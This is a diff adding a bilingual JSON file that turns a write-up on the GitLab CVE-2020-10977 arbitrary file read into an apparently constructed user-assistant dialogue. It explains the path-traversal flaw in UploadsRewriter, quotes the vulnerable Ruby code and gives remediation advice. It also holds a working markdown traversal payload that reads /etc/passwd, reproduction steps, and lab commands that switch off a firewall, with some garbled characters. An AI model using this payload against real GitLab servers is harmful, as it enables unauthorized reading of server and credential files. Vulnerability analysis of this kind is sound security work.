@@ -1,0 +1,171 @@
+{
+    "_source_md":  "Gitlab/2022-04-29-Gitlab-LFR-CVE-2020-10977.md",
+    "version":  "gitlab-lfr-cve-2020-10977",
+    "title":  {
+                  "zh":  "GitLab CVE-2020-10977 任意文件读取漏洞",
+                  "en":  "GitLab CVE-2020-10977 Arbitrary File Read Vulnerability"
+              },
+    "description":  {
+                        "zh":  "在 GitLab 8.5-12.9 版本中存在任意文件读取漏洞，攻击者无需特权即可读取服务器上的任意文件",
+                        "en":  "GitLab versions 8.5-12.9 contain an arbitrary file read vulnerability allowing attackers to read any file on server without privileges"
+                    },
+    "steps":  [
+                  {
+                      "type":  "user_message",
+                      "content":  {
+                                      "zh":  "分析 GitLab CVE-2020-10977 漏洞",
+                                      "en":  "Analyze GitLab CVE-2020-10977 vulnerability"
+                                  },
+                      "annotation":  {
+                                         "zh":  "用户请求分析 GitLab 文件读取漏洞",
+                                         "en":  "User requests analysis of GitLab file read vulnerability"
+                                     },
+                      "codeBlocks":  [
+                                         {
+                                             "caption":  {
+                                                             "zh":  "",
+                                                             "en":  ""
+                                                         },
+                                             "code":  "$ cat /opt/gitlab/embedded/service/gitlab-rails/VERSION\n12.8.1-ee",
+                                             "language":  "bash"
+                                         },
+                                         {
+                                             "caption":  {
+                                                             "zh":  "",
+                                                             "en":  ""
+                                                         },
+                                             "code":  "[root@ingeek bin4xin]# systemctl stop firewalld\n# CentOS鍏抽棴闃茬伀澧?[root@ingeek bin4xin]# systemctl disable firewalld.service\n# CentOS鍙栨秷闃茬伀澧欒嚜鍚姩\n[root@ingeek bin4xin]# systemctl status firewalld\n鈼?firewalld.service - firewalld - dynamic firewall daemon\n   Loaded: loaded (/usr/lib/systemd/system/firewalld.service; enabled; vendor preset: enabled)\n   Active: inactive (dead) since Wed 2022-05-04 22:11:30 EDT; 4s ago\n     Docs: man:firewalld(1)\n  Process: 7299 ExecStart=/usr/sbin/firewalld --nofork --nopid $FIREWALLD_ARGS (code=exited, status=0/SUCCESS)\n Main PID: 7299 (code=exited, status=0/SUCCESS)\n\nMay 04 22:10:48 ingeek systemd[1]: Stopped firewalld - dynamic firewall daemon.\nMay 04 22:10:48 ingeek systemd[1]: Starting firewalld - dynamic firewall daemon...\nMay 04 22:10:48 ingeek systemd[1]: Started firewalld - dynamic firewall daemon.\nMay 04 22:10:48 ingeek firewalld[7299]: WARNING: AllowZoneDrifting is enabled. This is considered an insecure configuration option. It will be removed in a future release. Please consider disabling it now.\nMay 04 22:11:29 ingeek systemd[1]: Stopping firewalld - dynamic firewall daemon...\nMay 04 22:11:30 ingeek systemd[1]: Stopped firewalld - dynamic firewall daemon.",
+                                             "language":  "bash"
+                                         },
+                                         {
+                                             "caption":  {
+                                                             "zh":  "",
+                                                             "en":  ""
+                                                         },
+                                             "code":  "$ sudo apt install docker.io\n$ docker pull gitlab/gitlab-ce:12.8.1-ce.0\n$ docker run gitlab/gitlab-ce:12.8.1-ce.0",
+                                             "language":  "bash"
+                                         },
+                                         {
+                                             "caption":  {
+                                                             "zh":  "",
+                                                             "en":  ""
+                                                         },
+                                             "code":  "![a](/uploads/11111111111111111111111111111111/../../../../../../../../../../../../../../etc/passwd)",
+                                             "language":  "markdown"
+                                         },
+                                         {
+                                             "caption":  {
+                                                             "zh":  "",
+                                                             "en":  ""
+                                                         },
+                                             "code":  "\u003cimg src=\"https://git-lab-domain.com/ysoserial/ysoserial/uploads/11111111111111111111111111111111/../../../../../../../../../../../../../../etc/passwd\" alt=\"a\"\u003e",
+                                             "language":  "html"
+                                         },
+                                         {
+                                             "caption":  {
+                                                             "zh":  "",
+                                                             "en":  ""
+                                                         },
+                                             "code":  "  MARKDOWN_PATTERN = %r{\\!?\\[.*?\\]\\(/uploads/(?\u003csecret\u003e[0-9a-f]{32})/(?\u003cfile\u003e.*?)\\)}.freeze",
+                                             "language":  "ruby"
+                                         },
+                                         {
+                                             "caption":  {
+                                                             "zh":  "",
+                                                             "en":  ""
+                                                         },
+                                             "code":  "#/opt/gitlab/embedded/service/gitlab-rails/lib/gitlab/gfm/uploads_rewriter.rb:\n\n   @text.gsub(@pattern) do |markdown|\n          file = find_file(@source_project, $~[:secret], $~[:file])\n          break markdown unless file.try(:exists?)\n\n          klass = target_parent.is_a?(Namespace) ? NamespaceFileUploader : FileUploader\n          moved = klass.copy_to(file, target_parent)\n   ...\n   def find_file(project, secret, file)\n        uploader = FileUploader.new(project, secret: secret)\n        uploader.retrieve_from_store!(file)\n        uploader\n      end",
+                                             "language":  "ruby"
+                                         }
+                                     ]
+                  },
+                  {
+                      "type":  "assistant_text",
+                      "content":  {
+                                      "zh":  "CVE-2020-10977 影响 GitLab CE/EE 8.5 至 12.9 版本。该漏洞的核心在于 UploadsRewriter 类在移动 issue 时不会验证文件名，允许通过目录遍历复制任意文件。当创建包含恶意 markdown 代码的 issue 并移动到其他项目时，可以读取服务器上的任意文件。",
+                                      "en":  "CVE-2020-10977 affects GitLab CE/EE versions 8.5 to 12.9. The core issue is that UploadsRewriter class doesn\u0027t validate filenames when moving issues, allowing arbitrary file copying via directory traversal. When creating an issue with malicious markdown code and moving it to another project, arbitrary files on server can be read."
+                                  },
+                      "annotation":  {
+                                         "zh":  "助手解释漏洞原理和影响版本",
+                                         "en":  "Assistant explains vulnerability mechanism and affected versions"
+                                     }
+                  },
+                  {
+                      "type":  "user_message",
+                      "content":  {
+                                      "zh":  "如何复现这个漏洞？",
+                                      "en":  "How to reproduce this vulnerability?"
+                                  },
+                      "annotation":  {
+                                         "zh":  "用户询问复现步骤",
+                                         "en":  "User asks for reproduction steps"
+                                     }
+                  },
+                  {
+                      "type":  "assistant_text",
+                      "content":  {
+                                      "zh":  "复现步骤：1) 注册账号并登录；2) 创建两个项目（如 test1 和 test2）；3) 在 test1 中创建一个 issue，填入 payload：![a](/uploads/11111111111111111111111111111111/../../../../../../../../../../../../../../etc/passwd)；4) 将该 issue 移动到 test2 项目；5) 点击 passwd 附件即可下载 /etc/passwd 文件。",
+                                      "en":  "Reproduction steps: 1) Register and login; 2) Create two projects (e.g., test1 and test2); 3) Create an issue in test1 with payload: ![a](/uploads/11111111111111111111111111111111/../../../../../../../../../../../../../../etc/passwd); 4) Move the issue to test2 project; 5) Click passwd attachment to download /etc/passwd file."
+                                  },
+                      "annotation":  {
+                                         "zh":  "助手提供详细的复现步骤",
+                                         "en":  "Assistant provides detailed reproduction steps"
+                                     }
+                  },
+                  {
+                      "type":  "user_message",
+                      "content":  {
+                                      "zh":  "漏洞的代码原理是什么？",
+                                      "en":  "What is the code mechanism behind this vulnerability?"
+                                  },
+                      "annotation":  {
+                                         "zh":  "用户询问代码层面的漏洞原理",
+                                         "en":  "User asks about code-level vulnerability mechanism"
+                                     }
+                  },
+                  {
+                      "type":  "assistant_text",
+                      "content":  {
+                                      "zh":  "问题出在 UploadsRewriter 类中，它使用的正则表达式 MARKDOWN_PATTERN = %r{\\!?\\[.*?\\]\\(/uploads/(?\u003csecret\u003e[0-9a-f]{32})/(?\u003cfile\u003e.*?)\\)} 匹配 markdown 中的上传文件引用。在 find_file 方法中直接使用用户传入的 file 参数调用 retrieve_from_store!，没有进行路径验证，导致可以使用 ../../ 进行目录遍历。",
+                                      "en":  "The issue is in UploadsRewriter class which uses regex MARKDOWN_PATTERN = %r{\\!?\\[.*?\\]\\(/uploads/(?\u003csecret\u003e[0-9a-f]{32})/(?\u003cfile\u003e.*?)\\)} to match markdown upload references. The find_file method directly uses user-supplied file parameter to call retrieve_from_store! without path validation, allowing directory traversal with ../../."
+                                  },
+                      "annotation":  {
+                                         "zh":  "助手深入分析代码层面的漏洞成因",
+                                         "en":  "Assistant analyzes code-level vulnerability cause in depth"
+                                     }
+                  },
+                  {
+                      "type":  "user_message",
+                      "content":  {
+                                      "zh":  "如何修复这个漏洞？",
+                                      "en":  "How to fix this vulnerability?"
+                                  },
+                      "annotation":  {
+                                         "zh":  "用户询问修复建议",
+                                         "en":  "User asks for fix recommendations"
+                                     }
+                  },
+                  {
+                      "type":  "assistant_text",
+                      "content":  {
+                                      "zh":  "修复建议：1) 关闭注册功能 - 以 Admin 身份登录后，进入 Admin Area -\u003e Setting -\u003e Sign-up restrictions，取消勾选 Sign-up enabled，可减少大部分通过匿名用户触发的漏洞；2) 更新版本 - 保持软件版本与上游版本一致，升级到 12.9.1 及以上版本。",
+                                      "en":  "Fix recommendations: 1) Disable registration - Login as Admin, go to Admin Area -\u003e Setting -\u003e Sign-up restrictions, uncheck Sign-up enabled to reduce most vulnerabilities triggered by anonymous users; 2) Update version - Keep software version consistent with upstream, upgrade to 12.9.1 or above."
+                                  },
+                      "annotation":  {
+                                         "zh":  "助手提供漏洞修复建议",
+                                         "en":  "Assistant provides vulnerability fix recommendations"
+                                     }
+                  },
+                  {
+                      "type":  "system_event",
+                      "content":  {
+                                      "zh":  "参考链接：HackerOne 报告 (https://hackerone.com/reports/827052)、CVE-2020-10977 Gitlab 任意文件读取导致远程命令执行 (https://github.com/EdgeSecurityTeam/Vulnerability)",
+                                      "en":  "References: HackerOne report (https://hackerone.com/reports/827052), CVE-2020-10977 Gitlab arbitrary file read leading to RCE (https://github.com/EdgeSecurityTeam/Vulnerability)"
+                                  },
+                      "annotation":  {
+                                         "zh":  "系统提供参考资料",
+                                         "en":  "System provides reference materials"
+                                     }
+                  }
+              ]
+}
